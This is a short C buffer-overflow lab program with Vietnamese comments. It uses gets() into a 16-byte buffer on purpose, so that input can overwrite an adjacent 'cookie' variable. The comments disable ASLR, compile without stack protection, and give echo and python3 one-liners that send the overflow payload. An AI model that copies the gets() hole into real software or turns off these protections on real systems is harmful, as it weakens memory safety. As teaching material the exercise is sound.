#include <stdio.h>

int main() {

  int cookie;
  char buf[16];
  printf("&buf: %p, &cookie: %p\n", buf, &cookie);

  gets(buf);
  printf("\n cookie = %10x \n",cookie);

  if (cookie == 0x01020305) {

    printf("You Win!\n");

  } else {

    printf("\n We need cookie = 0x01020305 \n");
  }

}
// ngắt tạm thời random địa chỉ : sudo sysctl -w kernel.randomize_va_space=0
// $ gcc -fno-stack-protector ./stack2.c -o stack2
// Nhập chuỗi đúng để ra được “You win!”
// C1 Sử dụng echo và pipe (|):
// echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaa\005\003\002\001" | ./stack2
// C2 Sử dụng python để nhập chuỗi
// python3 -c 'print("a"*28 + "\x05\x03\x02\x01")' | ./stack2